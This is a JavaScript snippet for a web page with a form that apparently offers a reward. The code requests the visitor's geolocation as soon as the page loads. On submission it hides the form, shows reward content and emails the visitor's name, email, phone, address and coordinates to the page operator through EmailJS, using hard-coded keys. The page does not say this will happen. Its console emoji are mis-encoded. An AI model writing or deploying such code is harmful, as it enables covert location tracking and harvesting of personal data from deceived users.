<script>
document.addEventListener("DOMContentLoaded", function () {
    emailjs.init("CrVHH3e0Kot5rmodE"); // Your EmailJS Public Key

    // Automatically request location permission when the page is loaded
    trackMovement();

    // When form is submitted
    document.getElementById("userForm").addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent form from reloading the page

        // Hide the form content
        document.getElementById("formContent").style.display = "none";

        // Show the reward content
        document.getElementById("rewardContent").style.display = "block";

        // Retrieve geolocation and send email after form submission
        trackMovement();
    });

    function sendLocationEmail(latitude, longitude) {
        // Collecting form data
        const templateParams = {
            username: document.getElementById("username").value,
            email: document.getElementById("email").value,
            phone: document.getElementById("phone").value,
            address: document.getElementById("address").value,
            latitude: latitude.toString(),
            longitude: longitude.toString()
        };

        // Debug log to check parameters
        console.log("üìç Sending Location Data:", templateParams);

        // Sending email via EmailJS
        emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
            .then((response) => {
                console.log("‚úÖ Email sent successfully!", response);
                document.getElementById("locationDisplay").textContent = "üìß Location sent!";
            })
            .catch((error) => {
                console.error("‚ùå Error sending email:", error);
                document.getElementById("locationDisplay").textContent = "‚ö†Ô∏è Email sending failed!";
            });
    }

    function trackMovement() {
        if ("geolocation" in navigator) {
            // This triggers the location permission prompt automatically when the page loads
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    console.log("üåç Location received:", latitude, longitude);
                    document.getElementById("locationDisplay").textContent =
                        `üìç Latitude: ${latitude}, Longitude: ${longitude}`;

                    // Send location data to EmailJS
                    sendLocationEmail(latitude, longitude);
                },
                (error) => {
                    console.error("‚ùå Error getting location:", error);
                    document.getElementById("locationDisplay").textContent =
                        "‚ö†Ô∏è Location access denied!";
                }
            );
        } else {
            console.log("‚ùå Geolocation not supported.");
            document.getElementById("locationDisplay").textContent = "‚ö†Ô∏è Geolocation not supported!";
        }
    }
});
</script>
